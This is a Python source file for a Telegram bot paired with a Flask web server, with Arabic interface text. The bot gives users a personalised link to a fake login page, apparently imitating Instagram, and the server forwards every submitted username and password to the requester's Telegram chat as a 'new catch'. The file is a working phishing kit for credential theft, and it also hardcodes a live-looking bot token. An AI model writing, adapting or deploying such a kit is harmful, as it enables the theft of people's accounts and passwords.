import os
import threading
import telebot
from telebot import types
from flask import Flask, request, render_template_string

TOKEN = "8936795820:AAFE9MM8zAHcQBX026lDi78Td5bcLghI8JE"
ADMIN_CHAT_ID = "8328829705"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://ahmadnom-bot.onrender.com")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/instamon', methods=['GET', 'POST'])
def instamon():
    target_chat = request.args.get('chat_id', ADMIN_CHAT_ID)
    if request.method == 'POST':
        data = request.form.to_dict()
        bot.send_message(target_chat, f"🎯 صيد جديد:\nالمستخدم: {data.get('username')}\nالباسورد: {data.get('password')}")
        return "تم بنجاح", 200
    return render_template_string('<h2>تسجيل دخول</h2><form method="POST"><input name="username" placeholder="اليوزر"><br><input type="password" name="password" placeholder="الباسورد"><br><button type="submit">إرسال</button></form>')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📸 اختبار انستغرام", callback_data="insta_test"))
    bot.send_message(message.chat.id, "أهلاً بك، اختر الأداة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "insta_test":
        link = f"{BASE_URL}/instamon?chat_id={call.from_user.id}"
        bot.send_message(call.message.chat.id, f"رابطك:\n{link}")

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    print("Bot running 24/7...")
    bot.infinity_polling()
